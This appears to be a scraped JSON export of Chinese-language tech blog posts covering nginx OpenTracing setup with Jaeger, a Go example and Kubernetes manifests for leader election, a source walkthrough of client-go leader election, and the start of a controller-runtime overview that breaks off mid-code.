\u0026quot;baggage_restrictions\u0026quot;: { \u0026quot;denyBaggageOnInitializationFailure\u0026quot;: false, \u0026quot;hostPort\u0026quot;: \u0026quot;\u0026quot; } } 在nginx中开启opentracing 对于 nginx-opentracing 更多的参数可以参考 Reference.md\n# 加载 OpenTracing 动态模块。 load_module conf/ngx_http_opentracing_module.so; worker_processes 1; user root root; events { worker_connections 1024; } http { log_format opentracing '{\u0026quot;timestamp\u0026quot;:\u0026quot;$time_iso8601\u0026quot;,' '\u0026quot;source\u0026quot;:\u0026quot;$server_addr\u0026quot;,' '\u0026quot;hostname\u0026quot;:\u0026quot;$hostname\u0026quot;,' '\u0026quot;ip\u0026quot;:\u0026quot;$http_x_forwarded_for\u0026quot;,' '\u0026quot;traceID\u0026quot;:\u0026quot;$opentracing_context_uber_trace_id\u0026quot;,' '\u0026quot;client\u0026quot;:\u0026quot;$remote_addr\u0026quot;,' '\u0026quot;request_method\u0026quot;:\u0026quot;$request_method\u0026quot;,' '\u0026quot;scheme\u0026quot;:\u0026quot;$scheme\u0026quot;,' '\u0026quot;domain\u0026quot;:\u0026quot;$server_name\u0026quot;,' '\u0026quot;referer\u0026quot;:\u0026quot;$http_referer\u0026quot;,' '\u0026quot;request\u0026quot;:\u0026quot;$request_uri\u0026quot;,' '\u0026quot;args\u0026quot;:\u0026quot;$args\u0026quot;,' '\u0026quot;size\u0026quot;:$body_bytes_sent,' '\u0026quot;status\u0026quot;: $status,' '\u0026quot;responsetime\u0026quot;:$request_time,' '\u0026quot;upstreamtime\u0026quot;:\u0026quot;$upstream_response_time\u0026quot;,' '\u0026quot;upstreamaddr\u0026quot;:\u0026quot;$upstream_addr\u0026quot;,' '\u0026quot;http_user_agent\u0026quot;:\u0026quot;$http_user_agent\u0026quot;,' '\u0026quot;https\u0026quot;:\u0026quot;$https\u0026quot;' '}'; # 加载 tracer，这里使用的jaeger，需要传递配置文件 opentracing_load_tracer conf/libjaegertracing.so conf/jaeger.json; # 启用 tracing opentracing on; # 设置tag，可选参数 opentracing_tag http_user_agent $http_user_agent; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { opentracing_operation_name $uri; opentracing_propagate_context; root html; index index.html index.htm; } access_log logs/access.log opentracing; error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } 注：这里使用的 opentracing-nginx 的动态库为 ot16 ，linux-amd64-nginx-1.22.0-ot16-ngx_http_module.so.tgz ，另外一个版本不兼容，-t 检查语法时会提示\n配置说明\n对于每一个location都可以对其设置别名，这个就是 opentracing_operation_name 与 opentracing_location_operation_name 的区别\nhttp { ... location = /upload/animal { opentracing_location_operation_name upload; ... 更多的配置说明可以参考 Tutorial.md\n此时我们可以在jaeger上查看，可以看到 NGINX 的 span（因为这里只配置了NGINX，没有配置更多的后端）。\nReference\n1 CentOS7 升级 GCC 到 5.4.0 版本\n2 libstdc++.so.6: version GLIBCXX_3.4.20 not found\n3 nginx load_module\n","permalink":"https://www.oomkill.com/2022/07/opentracing-nginx/","summary":"","title":"使nginx支持分布式追踪"},{"content":"Backgroud 前一章中，对kubernetes的选举原理进行了深度剖析，下面就通过一个example来实现一个，利用kubernetes提供的选举机制完成的高可用应用。\n对于此章需要提前对一些概念有所了解后才可以继续看下去\nleader election mechanism RBCA Pod runtime mechanism Implementation 代码实现 如果仅仅是使用Kubernetes中的锁，实现的代码也只有几行而已。\npackage main import ( \u0026quot;context\u0026quot; \u0026quot;flag\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;os\u0026quot; \u0026quot;os/signal\u0026quot; \u0026quot;syscall\u0026quot; \u0026quot;time\u0026quot; metav1 \u0026quot;k8s.io/apimachinery/pkg/apis/meta/v1\u0026quot; clientset \u0026quot;k8s.io/client-go/kubernetes\u0026quot; \u0026quot;k8s.io/client-go/rest\u0026quot; \u0026quot;k8s.io/client-go/tools/clientcmd\u0026quot; \u0026quot;k8s.io/client-go/tools/leaderelection\u0026quot; \u0026quot;k8s.io/client-go/tools/leaderelection/resourcelock\u0026quot; \u0026quot;k8s.io/klog/v2\u0026quot; ) func buildConfig(kubeconfig string) (*rest.Config, error) { if kubeconfig != \u0026quot;\u0026quot; { cfg, err := clientcmd.BuildConfigFromFlags(\u0026quot;\u0026quot;, kubeconfig) if err != nil { return nil, err } return cfg, nil } cfg, err := rest.InClusterConfig() if err != nil { return nil, err } return cfg, nil } func main() { klog.InitFlags(nil) var kubeconfig string var leaseLockName string var leaseLockNamespace string var id string // 初始化客户端的部分 flag.StringVar(\u0026amp;kubeconfig, \u0026quot;kubeconfig\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;absolute path to the kubeconfig file\u0026quot;) flag.StringVar(\u0026amp;id, \u0026quot;id\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;the holder identity name\u0026quot;) flag.StringVar(\u0026amp;leaseLockName, \u0026quot;lease-lock-name\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;the lease lock resource name\u0026quot;) flag.StringVar(\u0026amp;leaseLockNamespace, \u0026quot;lease-lock-namespace\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;the lease lock resource namespace\u0026quot;) flag.Parse() if leaseLockName == \u0026quot;\u0026quot; { klog.Fatal(\u0026quot;unable to get lease lock resource name (missing lease-lock-name flag).\u0026quot;) } if leaseLockNamespace == \u0026quot;\u0026quot; { klog.Fatal(\u0026quot;unable to get lease lock resource namespace (missing lease-lock-namespace flag).\u0026quot;) } config, err := buildConfig(kubeconfig) if err != nil { klog.Fatal(err) } client := clientset.NewForConfigOrDie(config) run := func(ctx context.Context) { // 实现的业务逻辑，这里仅仅为实验，就直接打印了 klog.Info(\u0026quot;Controller loop...\u0026quot;) for { fmt.Println(\u0026quot;I am leader, I was working.\u0026quot;) time.Sleep(time.Second * 5) } } // use a Go context so we can tell the leaderelection code when we // want to step down ctx, cancel := context.WithCancel(context.Background()) defer cancel() // 监听系统中断 ch := make(chan os.Signal, 1) signal.Notify(ch, os.Interrupt, syscall.SIGTERM) go func() { \u0026lt;-ch klog.Info(\u0026quot;Received termination, signaling shutdown\u0026quot;) cancel() }() // 创建一个资源锁 lock := \u0026amp;resourcelock.LeaseLock{ LeaseMeta: metav1.ObjectMeta{ Name: leaseLockName, Namespace: leaseLockNamespace, }, Client: client.CoordinationV1(), LockConfig: resourcelock.ResourceLockConfig{ Identity: id, }, } // 开启一个选举的循环 leaderelection.RunOrDie(ctx, leaderelection.LeaderElectionConfig{ Lock: lock, ReleaseOnCancel: true, LeaseDuration: 60 * time.Second, RenewDeadline: 15 * time.Second, RetryPeriod: 5 * time.Second, Callbacks: leaderelection.LeaderCallbacks{ OnStartedLeading: func(ctx context.Context) { // 当选举为leader后所运行的业务逻辑 run(ctx) }, OnStoppedLeading: func() { // we can do cleanup here klog.Infof(\u0026quot;leader lost: %s\u0026quot;, id) os.Exit(0) }, OnNewLeader: func(identity string) { // 申请一个选举时的动作 if identity == id { return } klog.Infof(\u0026quot;new leader elected: %s\u0026quot;, identity) }, }, }) } 注：这种lease锁只能在in-cluster模式下运行，如果需要类似二进制部署的程序，可以选择endpoint类型的资源锁。\n生成镜像 这里已经制作好了镜像并上传到dockerhub（cylonchau/leaderelection:v0.0.2）上了，如果只要学习运行原理，则忽略此步骤\nFROM golang:alpine AS builder MAINTAINER cylon WORKDIR /election COPY . /election ENV GOPROXY https://goproxy.cn,direct RUN GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o elector main.go FROM alpine AS runner WORKDIR /go/elector COPY --from=builder /election/elector . VOLUME [\u0026quot;/election\u0026quot;] ENTRYPOINT [\u0026quot;./elector\u0026quot;] 准备资源清单 默认情况下，Kubernetes运行的pod在请求Kubernetes集群内资源时，默认的账户是没有权限的，默认服务帐户无权访问协调 API，因此我们需要创建另一个serviceaccount并相应地设置 对应的RBAC权限绑定；在清单中配置上这个sa，此时所有的pod就会有协调锁的权限了\napiVersion: v1 kind: ServiceAccount metadata: name: sa-leaderelection --- apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: leaderelection rules: - apiGroups: - coordination.k8s.io resources: - leases verbs: - '*' --- apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: leaderelection roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: leaderelection subjects: - kind: ServiceAccount name: sa-leaderelection --- apiVersion: apps/v1 kind: Deployment metadata: labels: app: leaderelection name: leaderelection namespace: default spec: replicas: 3 selector: matchLabels: app: leaderelection template: metadata: labels: app: leaderelection spec: containers: - image: cylonchau/leaderelection:v0.0.2 imagePullPolicy: IfNotPresent command: [\u0026quot;./elector\u0026quot;] args: - \u0026quot;-id=$(POD_NAME)\u0026quot; - \u0026quot;-lease-lock-name=test\u0026quot; - \u0026quot;-lease-lock-namespace=default\u0026quot; env: - name: POD_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: metadata.name name: elector serviceAccountName: sa-leaderelection 集群中运行 执行完清单后，当pod启动后，可以看到会创建出一个 lease\n$ kubectl get lease NAME HOLDER AGE test leaderelection-5644c5f84f-frs5n 1s $ kubectl describe lease Name: test Namespace: default Labels: \u0026lt;none\u0026gt; Annotations: \u0026lt;none\u0026gt; API Version: coordination.k8s.io/v1 Kind: Lease Metadata: Creation Timestamp: 2022-06-28T16:39:45Z Managed Fields: API Version: coordination.k8s.io/v1 Fields Type: FieldsV1 fieldsV1: f:spec: f:acquireTime: f:holderIdentity: f:leaseDurationSeconds: f:leaseTransitions: f:renewTime: Manager: elector Operation: Update Time: 2022-06-28T16:39:45Z Resource Version: 131693 Self Link: /apis/coordination.k8s.io/v1/namespaces/default/leases/test UID: bef2b164-a117-44bd-bad3-3e651c94c97b Spec: Acquire Time: 2022-06-28T16:39:45.931873Z Holder Identity: leaderelection-5644c5f84f-frs5n Lease Duration Seconds: 60 Lease Transitions: 0 Renew Time: 2022-06-28T16:39:55.963537Z Events: \u0026lt;none\u0026gt; 通过其持有者的信息查看对应pod（因为程序中对holder Identity设置的是pod的名称），实际上是工作的pod。\n如上实例所述，这是利用Kubernetes集群完成的leader选举的方案，虽然这不是最完美解决方案，但这是一种简单的方法，因为可以无需在集群上部署更多东西或者进行大量的代码工作就可以利用Kubernetes集群来完成一个高可用的HA应用。\n","permalink":"https://www.oomkill.com/2022/06/ch28-leader-election-eg/","summary":"","title":"利用kubernetes中的leader选举机制自定义HA应用"},{"content":"Overview 在 Kubernetes的 kube-controller-manager , kube-scheduler, 以及使用 Operator 的底层实现 controller-rumtime 都支持高可用系统中的leader选举，本文将以理解 controller-rumtime （底层的实现是 client-go） 中的leader选举以在kubernetes controller中是如何实现的。\nBackground 在运行 kube-controller-manager 时，是有一些参数提供给cm进行leader选举使用的，可以参考官方文档提供的 参数 来了解相关参数。\n--leader-elect Default: true --leader-elect-renew-deadline duration Default: 10s --leader-elect-resource-lock string Default: \u0026quot;leases\u0026quot; --leader-elect-resource-name string Default: \u0026quot;kube-controller-manager\u0026quot; --leader-elect-resource-namespace string Default: \u0026quot;kube-system\u0026quot; --leader-elect-retry-period duration Default: 2s ... 本身以为这些组件的选举动作时通过etcd进行的，但是后面对 controller-runtime 学习时，发现并没有配置其相关的etcd相关参数，这就引起了对选举机制的好奇。怀着这种好奇心搜索了下有关于 kubernetes的选举，发现官网是这么介绍的，下面是对官方的说明进行一个通俗总结。simple leader election with kubernetes\n通过阅读文章得知，kubernetes API 提供了一中选举机制，只要运行在集群内的容器，都是可以实现选举功能的。\nKubernetes API通过提供了两个属性来完成选举动作的\nResourceVersions：每个API对象唯一一个ResourceVersion Annotations：每个API对象都可以对这些key进行注释 注：这种选举会增加APIServer的压力。也就对etcd会产生影响\n那么有了这些信息之后，我们来看一下，在Kubernetes集群中，谁是cm的leader（我们提供的集群只有一个节点，所以本节点就是leader）\n在Kubernetes中所有启用了leader选举的服务都会生成一个 EndPoint ，在这个 EndPoint 中会有上面提到的label（Annotations）来标识谁是leader。\n$ kubectl get ep -n kube-system NAME ENDPOINTS AGE kube-controller-manager \u0026lt;none\u0026gt; 3d4h kube-dns 3d4h kube-scheduler \u0026lt;none\u0026gt; 3d4h 这里以 kube-controller-manager 为例，来看下这个 EndPoint 有什么信息\n$ kubectl describe ep kube-controller-manager -n kube-system Name: kube-controller-manager Namespace: kube-system Labels: \u0026lt;none\u0026gt; Annotations: control-plane.alpha.kubernetes.io/leader: {\u0026quot;holderIdentity\u0026quot;:\u0026quot;master-machine_06730140-a503-487d-850b-1fe1619f1fe1\u0026quot;,\u0026quot;leaseDurationSeconds\u0026quot;:15,\u0026quot;acquireTime\u0026quot;:\u0026quot;2022-06-27T15:30:46Z\u0026quot;,\u0026quot;re... Subsets: Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal LeaderElection 2d22h kube-controller-manager master-machine_76aabcb5-49ff-45ff-bd18-4afa61fbc5af became leader Normal LeaderElection 9m kube-controller-manager master-machine_06730140-a503-487d-850b-1fe1619f1fe1 became leader 可以看出 Annotations: control-plane.alpha.kubernetes.io/leader: 标出了哪个node是leader。\nelection in controller-runtime controller-runtime 有关leader选举的部分在 pkg/leaderelection 下面，总共100行代码，我们来看下做了些什么？\n可以看到，这里只提供了创建资源锁的一些选项\ntype Options struct { // 在manager启动时，决定是否进行选举 LeaderElection bool // 使用那种资源锁 默认为租用 lease LeaderElectionResourceLock string // 选举发生的名称空间 LeaderElectionNamespace string // 该属性将决定持有leader锁资源的名称 LeaderElectionID string } 通过 NewResourceLock 可以看到，这里是走的 client-go/tools/leaderelection下面，而这个leaderelection也有一个 example 来学习如何使用它。\n通过 example 可以看到，进入选举的入口是一个 RunOrDie() 的函数\n// 这里使用了一个lease锁，注释中说愿意为集群中存在lease的监听较少 lock := \u0026amp;resourcelock.LeaseLock{ LeaseMeta: metav1.ObjectMeta{ Name: leaseLockName, Namespace: leaseLockNamespace, }, Client: client.CoordinationV1(), LockConfig: resourcelock.ResourceLockConfig{ Identity: id, }, } // 开启选举循环 leaderelection.RunOrDie(ctx, leaderelection.LeaderElectionConfig{ Lock: lock, // 这里必须保证拥有的租约在调用cancel()前终止，否则会仍有一个loop在运行 ReleaseOnCancel: true, LeaseDuration: 60 * time.Second, RenewDeadline: 15 * time.Second, RetryPeriod: 5 * time.Second, Callbacks: leaderelection.LeaderCallbacks{ OnStartedLeading: func(ctx context.Context) { // 这里填写你的代码， // usually put your code run(ctx) }, OnStoppedLeading: func() { // 这里清理你的lease klog.Infof(\u0026quot;leader lost: %s\u0026quot;, id) os.Exit(0) }, OnNewLeader: func(identity string) { // we're notified when new leader elected if identity == id { // I just got the lock return } klog.Infof(\u0026quot;new leader elected: %s\u0026quot;, identity) }, }, }) 到这里，我们了解了锁的概念和如何启动一个锁，下面看下，client-go都提供了那些锁。\n在代码 tools/leaderelection/resourcelock/interface.go 定义了一个锁抽象，interface提供了一个通用接口，用于锁定leader选举中使用的资源。\ntype Interface interface { // Get 返回选举记录 Get(ctx context.Context) (*LeaderElectionRecord, []byte, error) // Create 创建一个LeaderElectionRecord Create(ctx context.Context, ler LeaderElectionRecord) error // Update will update and existing LeaderElectionRecord Update(ctx context.Context, ler LeaderElectionRecord) error // RecordEvent is used to record events RecordEvent(string) // Identity 返回锁的标识 Identity() string // Describe is used to convert details on current resource lock into a string Describe() string } 那么实现这个抽象接口的就是，实现的资源锁，我们可以看到，client-go提供了四种资源锁\nleaselock configmaplock multilock endpointlock leaselock Lease是kubernetes控制平面中的通过ETCD来实现的一个Leases的资源，主要为了提供分布式租约的一种控制机制。相关对这个API的描述可以参考于：Lease 。\n在Kubernetes集群中，我们可以使用如下命令来查看对应的lease\n$ kubectl get leases -A NAMESPACE NAME HOLDER AGE kube-node-lease master-machine master-machine 3d19h kube-system kube-controller-manager master-machine_06730140-a503-487d-850b-1fe1619f1fe1 3d19h kube-system kube-scheduler master-machine_1724e2d9-c19c-48d7-ae47-ee4217b27073 3d19h $ kubectl describe leases kube-controller-manager -n kube-system Name: kube-controller-manager Namespace: kube-system Labels: \u0026lt;none\u0026gt; Annotations: \u0026lt;none\u0026gt; API Version: coordination.k8s.io/v1 Kind: Lease Metadata: Creation Timestamp: 2022-06-24T11:01:51Z Managed Fields: API Version: coordination.k8s.io/v1 Fields Type: FieldsV1 fieldsV1: f:spec: f:acquireTime: f:holderIdentity: f:leaseDurationSeconds: f:leaseTransitions: f:renewTime: Manager: kube-controller-manager Operation: Update Time: 2022-06-24T11:01:51Z Resource Version: 56012 Self Link: /apis/coordination.k8s.io/v1/namespaces/kube-system/leases/kube-controller-manager UID: 851a32d2-25dc-49b6-a3f7-7a76f152f071 Spec: Acquire Time: 2022-06-27T15:30:46.000000Z Holder Identity: master-machine_06730140-a503-487d-850b-1fe1619f1fe1 Lease Duration Seconds: 15 Lease Transitions: 2 Renew Time: 2022-06-28T06:09:26.837773Z Events: \u0026lt;none\u0026gt; 下面来看下leaselock的实现，leaselock会实现了作为资源锁的抽象\ntype LeaseLock struct { // LeaseMeta 就是类似于其他资源类型的属性，包含name ns 以及其他关于lease的属性 LeaseMeta metav1.ObjectMeta Client coordinationv1client.LeasesGetter // Client 就是提供了informer中的功能 // lockconfig包含上面通过 describe 看到的 Identity与recoder用于记录资源锁的更改 LockConfig ResourceLockConfig // lease 就是 API中的Lease资源，可以参考下上面给出的这个API的使用 lease *coordinationv1.Lease } 下面来看下leaselock实现了那些方法？\nGet Get 是从spec中返回选举的记录\nfunc (ll *LeaseLock) Get(ctx context.Context) (*LeaderElectionRecord, []byte, error) { var err error ll.lease, err = ll.Client.Leases(ll.LeaseMeta.Namespace).Get(ctx, ll.LeaseMeta.Name, metav1.GetOptions{}) if err != nil { return nil, nil, err } record := LeaseSpecToLeaderElectionRecord(\u0026amp;ll.lease.Spec) recordByte, err := json.Marshal(*record) if err != nil { return nil, nil, err } return record, recordByte, nil } // 可以看出是返回这个资源spec里面填充的值 func LeaseSpecToLeaderElectionRecord(spec *coordinationv1.LeaseSpec) *LeaderElectionRecord { var r LeaderElectionRecord if spec.HolderIdentity != nil { r.HolderIdentity = *spec.HolderIdentity } if spec.LeaseDurationSeconds != nil { r.LeaseDurationSeconds = int(*spec.LeaseDurationSeconds) } if spec.LeaseTransitions != nil { r.LeaderTransitions = int(*spec.LeaseTransitions) } if spec.AcquireTime != nil { r.AcquireTime = metav1.Time{spec.AcquireTime.Time} } if spec.RenewTime != nil { r.RenewTime = metav1.Time{spec.RenewTime.Time} } return \u0026amp;r } Create Create 是在kubernetes集群中尝试去创建一个租约，可以看到，Client就是API提供的对应资源的REST客户端，结果会在Kubernetes集群中创建这个Lease\nfunc (ll *LeaseLock) Create(ctx context.Context, ler LeaderElectionRecord) error { var err error ll.lease, err = ll.Client.Leases(ll.LeaseMeta.Namespace).Create(ctx, \u0026amp;coordinationv1.Lease{ ObjectMeta: metav1.ObjectMeta{ Name: ll.LeaseMeta.Name, Namespace: ll.LeaseMeta.Namespace, }, Spec: LeaderElectionRecordToLeaseSpec(\u0026amp;ler), }, metav1.CreateOptions{}) return err } Update Update 是更新Lease的spec\nfunc (ll *LeaseLock) Update(ctx context.Context, ler LeaderElectionRecord) error { if ll.lease == nil { return errors.New(\u0026quot;lease not initialized, call get or create first\u0026quot;) } ll.lease.Spec = LeaderElectionRecordToLeaseSpec(\u0026amp;ler) lease, err := ll.Client.Leases(ll.LeaseMeta.Namespace).Update(ctx, ll.lease, metav1.UpdateOptions{}) if err != nil { return err } ll.lease = lease return nil } RecordEvent RecordEvent 是记录选举时出现的事件，这时候我们回到上部分 在kubernetes集群中查看 ep 的信息时可以看到的event中存在 became leader 的事件，这里就是将产生的这个event添加到 meta-data 中。\nfunc (ll *LeaseLock) RecordEvent(s string) { if ll.LockConfig.EventRecorder == nil { return } events := fmt.Sprintf(\u0026quot;%v %v\u0026quot;, ll.LockConfig.Identity, s) subject := \u0026amp;coordinationv1.Lease{ObjectMeta: ll.lease.ObjectMeta} // Populate the type meta, so we don't have to get it from the schema subject.Kind = \u0026quot;Lease\u0026quot; subject.APIVersion = coordinationv1.SchemeGroupVersion.String() ll.LockConfig.EventRecorder.Eventf(subject, corev1.EventTypeNormal, \u0026quot;LeaderElection\u0026quot;, events) } 到这里大致上了解了资源锁究竟是什么了，其他种类的资源锁也是相同的实现的方式，这里就不过多阐述了；下面的我们来看看选举的过程。\nelection workflow 选举的代码入口是在 leaderelection.go ，这里会继续上面的 example 向下分析整个选举的过程。\n前面我们看到了进入选举的入口是一个 RunOrDie() 的函数，那么就继续从这里开始来了解。进入 RunOrDie，看到其实只有几行而已，大致上了解到了RunOrDie会使用提供的配置来启动选举的客户端，之后会阻塞，直到 ctx 退出，或停止持有leader的租约。\nfunc RunOrDie(ctx context.Context, lec LeaderElectionConfig) { le, err := NewLeaderElector(lec) if err != nil { panic(err) } if lec.WatchDog != nil { lec.WatchDog.SetLeaderElection(le) } le.Run(ctx) } 下面看下 NewLeaderElector 做了些什么？可以看到，LeaderElector是一个结构体，这里只是创建他，这个结构体提供了我们选举中所需要的一切（LeaderElector就是RunOrDie创建的选举客户端）。\nfunc NewLeaderElector(lec LeaderElectionConfig) (*LeaderElector, error) { if lec.LeaseDuration \u0026lt;= lec.RenewDeadline { return nil, fmt.Errorf(\u0026quot;leaseDuration must be greater than renewDeadline\u0026quot;) } if lec.RenewDeadline \u0026lt;= time.Duration(JitterFactor*float64(lec.RetryPeriod)) { return nil, fmt.Errorf(\u0026quot;renewDeadline must be greater than retryPeriod*JitterFactor\u0026quot;) } if lec.LeaseDuration \u0026lt; 1 { return nil, fmt.Errorf(\u0026quot;leaseDuration must be greater than zero\u0026quot;) } if lec.RenewDeadline \u0026lt; 1 { return nil, fmt.Errorf(\u0026quot;renewDeadline must be greater than zero\u0026quot;) } if lec.RetryPeriod \u0026lt; 1 { return nil, fmt.Errorf(\u0026quot;retryPeriod must be greater than zero\u0026quot;) } if lec.Callbacks.OnStartedLeading == nil { return nil, fmt.Errorf(\u0026quot;OnStartedLeading callback must not be nil\u0026quot;) } if lec.Callbacks.OnStoppedLeading == nil { return nil, fmt.Errorf(\u0026quot;OnStoppedLeading callback must not be nil\u0026quot;) } if lec.Lock == nil { return nil, fmt.Errorf(\u0026quot;Lock must not be nil.\u0026quot;) } le := LeaderElector{ config: lec, clock: clock.RealClock{}, metrics: globalMetricsFactory.newLeaderMetrics(), } le.metrics.leaderOff(le.config.Name) return \u0026amp;le, nil } LeaderElector 是建立的选举客户端，\ntype LeaderElector struct { config LeaderElectionConfig // 这个的配置，包含一些时间参数，健康检查 // recoder相关属性 observedRecord rl.LeaderElectionRecord observedRawRecord []byte observedTime time.Time // used to implement OnNewLeader(), may lag slightly from the // value observedRecord.HolderIdentity if the transition has // not yet been reported. reportedLeader string // clock is wrapper around time to allow for less flaky testing clock clock.Clock // 锁定 observedRecord observedRecordLock sync.Mutex metrics leaderMetricsAdapter } 可以看到 Run 实现的选举逻辑就是在初始化客户端时传入的 三个 callback\nfunc (le *LeaderElector) Run(ctx context.Context) { defer runtime.HandleCrash() defer func() { // 退出时执行callbacke的OnStoppedLeading le.config.Callbacks.OnStoppedLeading() }() if !le.acquire(ctx) { return } ctx, cancel := context.WithCancel(ctx) defer cancel() go le.config.Callbacks.OnStartedLeading(ctx) // 选举时，执行 OnStartedLeading le.renew(ctx) } 在 Run 中调用了 acquire，这个是 通过一个loop去调用 tryAcquireOrRenew，直到ctx传递过来结束信号\nfunc (le *LeaderElector) acquire(ctx context.Context) bool { ctx, cancel := context.WithCancel(ctx) defer cancel() succeeded := false desc := le.config.Lock.Describe() klog.Infof(\u0026quot;attempting to acquire leader lease %v...\u0026quot;, desc) // jitterUntil是执行定时的函数 func() 是定时任务的逻辑 // RetryPeriod是周期间隔 // JitterFactor 是重试系数，类似于延迟队列中的系数 （duration + maxFactor * duration） // sliding 逻辑是否计算在时间内 // 上下文传递 wait.JitterUntil(func() { succeeded = le.tryAcquireOrRenew(ctx) le.maybeReportTransition() if !succeeded { klog.V(4).Infof(\u0026quot;failed to acquire lease %v\u0026quot;, desc) return } le.config.Lock.RecordEvent(\u0026quot;became leader\u0026quot;) le.metrics.leaderOn(le.config.Name) klog.Infof(\u0026quot;successfully acquired lease %v\u0026quot;, desc) cancel() }, le.config.RetryPeriod, JitterFactor, true, ctx.Done()) return succeeded } 这里实际上选举动作在 tryAcquireOrRenew 中，下面来看下tryAcquireOrRenew；tryAcquireOrRenew 是尝试获得一个leader租约，如果已经获得到了，则更新租约；否则可以得到租约则为true，反之false\nfunc (le *LeaderElector) tryAcquireOrRenew(ctx context.Context) bool { now := metav1.Now() // 时间 leaderElectionRecord := rl.LeaderElectionRecord{ // 构建一个选举record HolderIdentity: le.config.Lock.Identity(), // 选举人的身份特征，ep与主机名有关 LeaseDurationSeconds: int(le.config.LeaseDuration / time.Second), // 默认15s RenewTime: now, // 重新获取时间 AcquireTime: now, // 获得时间 } // 1. 从API获取或创建一个recode，如果可以拿到则已经有租约，反之创建新租约 oldLeaderElectionRecord, oldLeaderElectionRawRecord, err := le.config.Lock.Get(ctx) if err != nil { if !errors.IsNotFound(err) { klog.Errorf(\u0026quot;error retrieving resource lock %v: %v\u0026quot;, le.config.Lock.Describe(), err) return false } // 创建租约的动作就是新建一个对应的resource，这个lock就是leaderelection提供的四种锁， // 看你在runOrDie中初始化传入了什么锁 if err = le.config.Lock.Create(ctx, leaderElectionRecord); err != nil { klog.Errorf(\u0026quot;error initially creating leader election record: %v\u0026quot;, err) return false } // 到了这里就已经拿到或者创建了租约，然后记录其一些属性，LeaderElectionRecord le.setObservedRecord(\u0026amp;leaderElectionRecord) return true } // 2. 获取记录检查身份和时间 if !bytes.Equal(le.observedRawRecord, oldLeaderElectionRawRecord) { le.setObservedRecord(oldLeaderElectionRecord) le.observedRawRecord = oldLeaderElectionRawRecord } if len(oldLeaderElectionRecord.HolderIdentity) \u0026gt; 0 \u0026amp;\u0026amp; le.observedTime.Add(le.config.LeaseDuration).After(now.Time) \u0026amp;\u0026amp; !le.IsLeader() { // 不是leader，进行HolderIdentity比较，再加上时间，这个时候没有到竞选其，跳出 klog.V(4).Infof(\u0026quot;lock is held by %v and has not yet expired\u0026quot;, oldLeaderElectionRecord.HolderIdentity) return false } // 3.我们将尝试更新。 在这里leaderElectionRecord设置为默认值。让我们在更新之前更正它。 if le.IsLeader() { // 到这就说明是leader，修正他的时间 leaderElectionRecord.AcquireTime = oldLeaderElectionRecord.AcquireTime leaderElectionRecord.LeaderTransitions = oldLeaderElectionRecord.LeaderTransitions } else { // LeaderTransitions 就是指leader调整（转变为其他）了几次，如果是， // 则为发生转变，保持原有值 // 反之，则+1 leaderElectionRecord.LeaderTransitions = oldLeaderElectionRecord.LeaderTransitions + 1 } // 完事之后更新APIServer中的锁资源，也就是更新对应的资源的属性信息 if err = le.config.Lock.Update(ctx, leaderElectionRecord); err != nil { klog.Errorf(\u0026quot;Failed to update lock: %v\u0026quot;, err) return false } // setObservedRecord 是通过一个新的record来更新这个锁中的record // 操作是安全的，会上锁保证临界区仅可以被一个线程/进程操作 le.setObservedRecord(\u0026amp;leaderElectionRecord) return true } summary 到这里，已经完整知道利用kubernetes进行选举的流程都是什么了；下面简单回顾下，上述leader选举所有的步骤：\n首选创建的服务就是该服务的leader，锁可以为 lease , endpoint 等资源进行上锁 已经是leader的实例会不断续租，租约的默认值是15秒 （leaseDuration）；leader在租约满时更新租约时间（renewTime）。 其他的follower，会不断检查对应资源锁的存在，如果已经有leader，那么则检查 renewTime，如果超过了租用时间（），则表明leader存在问题需要重新启动选举，直到有follower提升为leader。 而为了避免资源被抢占，Kubernetes API使用了 ResourceVersion 来避免被重复修改（如果版本号与请求版本号不一致，则表示已经被修改了，那么APIServer将返回错误） Reference\nKubernetes 并发控制与数据一致性的实现原理\nController manager 的高可用实现方式\ndeep dive into kubernetes simple leader election\n","permalink":"https://www.oomkill.com/2022/06/ch27-leader-election/","summary":"","title":"源码分析Kubernetes HA机制 - leader election"},{"content":"Overview controller-runtime 是 Kubernetes 社区提供可供快速搭建一套 实现了controller 功能的工具，无需自行实现Controller的功能了；在 Kubebuilder 与 Operator SDK 也是使用 controller-runtime 。本文将对 controller-runtime 的工作原理以及在不同场景下的使用方式进行简要的总结和介绍。\ncontroller-runtime structure controller-runtime 主要组成是需要用户创建的 Manager 和 Reconciler 以及 Controller Runtime 自己启动的 Cache 和 Controller 。\nManager：是用户在初始化时创建的，用于启动 Controller Runtime 组件 Reconciler：是用户需要提供来处理自己的业务逻辑的组件（即在通过 code-generator 生成的api-like而实现的controller中的业务处理部分）。 Cache：一个缓存，用来建立 Informer 到 ApiServer 的连接来监听资源并将被监听的对象推送到queue中。 Controller： 一方面向 Informer 注册 eventHandler，另一方面从队列中获取数据。controller 将从队列中获取数据并执行用户自定义的 Reconciler 功能。 图：controller-runtime structure 图：controller-runtime flowchart 由图可知，Controller会向 Informer 注册一些列eventHandler；然后Cache启动Informer（informer属于cache包中），与ApiServer建立监听；当Informer检测到资源变化时，将对象加入queue，Controller 将元素取出并在用户端执行 Reconciler。\nController引入 我们从 controller-rumtime项目的 example 进行引入看下，整个架构都是如何实现的。\n可以看到 example 下的实际上实现了一个 reconciler 的结构体，实现了 Reconciler 抽象和 Client 结构体\ntype reconciler struct { client.Client scheme *runtime.Scheme } 那么来看下 抽象的 Reconciler 是什么，可以看到就是抽象了 Reconcile 方法，这个是具体处理的逻辑过程\ntype Reconciler interface { Reconcile(context.Context, Request) (Result, error) } 下面在看下谁来实现了这个 Reconciler 抽象\ntype Controller interface { reconcile.Reconciler // 协调的具体步骤，通过ns/name\\ // 通过predicates来评估来源数据，并加入queue中（放入队列的是reconcile.Requests） Watch(src source.Source, eventhandler handler.EventHandler, predicates 